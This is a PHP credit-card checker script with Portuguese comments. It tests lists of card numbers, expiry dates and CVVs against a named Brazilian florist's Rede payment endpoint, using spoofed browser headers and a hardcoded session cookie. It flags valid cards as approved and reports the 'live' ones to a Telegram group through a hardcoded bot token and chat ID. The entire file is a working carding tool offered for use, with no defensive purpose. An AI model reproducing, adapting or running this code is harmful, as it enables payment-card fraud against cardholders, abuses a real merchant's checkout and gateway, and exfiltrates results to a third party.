<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// URL do endpoint
$url = "https://www.coroas24horas.com.br/redecard-processa.php";

// Cabeçalhos da requisição
$headers = [
    "Host: www.coroas24horas.com.br",
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOYLMQ49KUv5xEBBn",
    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Accept: */*",
    "Origin: https://www.coroas24horas.com.br",
    "Referer: https://www.coroas24horas.com.br/pedido-finalizado/299332-4.html",
    "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
    "Cookie: PHPSESSID=tjo09cc92i3a2lulkpugpskld1; clix.session=2783258907564146; _fb.2.1754114896512.897751804860810456; _GA1.1.525385210.1754114898; cf_clearance=QfvbI16gUTQat_suPL6E._RvEWUwy.r1iJUuRgxp2PU-1752904560-1.2.1.1-hLJU9vOd4mJmJr_Y0F7wZ5kFLuOi5x5t_6MKrZZIaZFkhiX08JPydcUYrrDaA4qSWcOZ2fc_hp_sDT72hU4EzY2.0gwLfTs73O5Z_PHBOt3l8rmMKMmO0L6Wna50oNb1O0jDjO.sFWRF2KSoNPnrtx5X5blXgtRBARf3pXvGb4wOgeikSEV57qAjzllphtO2q_LvWBw9mxodcIvHbysrcKTUeKFJJckA6geQyzMZDE8"
];

// Função para enviar mensagem para o Telegram
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML' // Para permitir formatação HTML
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context); // Adiciona @ para suprimir erros
}

// Obtém a lista de cartões da query string
$lista = $_GET['lista'] ?? '';
$cartoes = explode(",", $lista); // Supondo que os cartões sejam passados como uma string separada por vírgulas

foreach ($cartoes as $card) {
    try {
        list($cc, $mes, $ano, $cvv) = explode("|", $card);

        $payload = "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-numero\"\r\n\r\n" .
                   "$cc\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-nome\"\r\n\r\n" .
                   "Pedro Henrique\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-validade-month\"\r\n\r\n" .
                   "$mes\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-validade-year\"\r\n\r\n" .
                   "$ano\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-seguranca\"\r\n\r\n" .
                   "$cvv\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-parcela\"\r\n\r\n" .
                   "1\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"code\"\r\n\r\n" .
                   "299332\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn--";

        $max_attempts = 3;
        $attempt = 0;
        $success = false;
        $response = '';
        $tempo_resposta = 0;
        $message = '';

        while ($attempt < $max_attempts && !$success) {
            $attempt++;
            sleep(5); // Espera 5 segundos antes de cada tentativa

            // Inicializa cURL
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Desativa verificação SSL

            // Executa a requisição
            $start_time = microtime(true); // Inicia o cronômetro
            $response = curl_exec($ch);
            $resp_text = trim($response);
            $end_time = microtime(true); // Para o cronômetro

            // Calcula o tempo de resposta
            $tempo_resposta = round($end_time - $start_time, 2);

            // Verifica a resposta
            $returnCode = ''; // Variável para armazenar o returnCode
            $message = ''; // Variável para armazenar a mensagem

            // Tenta decodificar a resposta JSON
            $json_response = json_decode($resp_text, true);
            if (isset($json_response['returnCode'])) {
                $returnCode = $json_response['returnCode'];
                $message = $json_response['message'] ?? 'Sem mensagem';
            } else {
                $message = $resp_text; // Usa a resposta bruta se não for JSON
            }

            // Verifica se a resposta contém o erro de IP inválido
            if (stripos($message, 'PV with invalid ip origin') !== false && $attempt < $max_attempts) {
                curl_close($ch); // Fecha a conexão cURL
                continue; // Tenta novamente após o atraso
            }

            $success = true; // Sai do loop se não for o erro de IP ou se for a última tentativa
            curl_close($ch); // Fecha a conexão cURL
        }

        // Formata a saída
        if ($returnCode === "119") {
            // Envio para o Telegram
            $botToken = "7748457693:AAHGW30nEHdbGBI6pCZNdQPzCUgUPiUfO4k"; // Substitua pelo seu token do bot
            $chatId = "-1002422757085"; // ID do grupo
            $telegramMessage = "✅ LIVE CHECKER GG VIP\n" .
                               "🛠 GATE: E-REDE\n" .
                               "💳 BIN: " . substr($cc, 0, 6) . "******\n" . // Mostra apenas os 6 primeiros dígitos da BIN
                               "🔄 RETORNO: $message\n" .
                               "🥇 CREDITOS: @augusto360\n" .
                               "⏳ Tempo: ($tempo_resposta SEG)";
            sendTelegramMessage($chatId, $telegramMessage, $botToken);

            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
        } elseif (strpos($resp_text, 'is3DSecureRequired') !== false) {
            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
        } else {
            echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='text-danger'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
        }

        sleep(5); // Espera 5 segundos antes de processar o próximo cartão

    } catch (Exception $e) {
        echo "<span class='badge badge-danger'>Erro</span> » $cc|$mes|$ano|$cvv » <b>Mensagem: <span class='text-danger'>" . $e->getMessage() . "</span></b> » <b>Tempo: ($tempo_resposta SEG) »</b><br>";
    }
}
?>
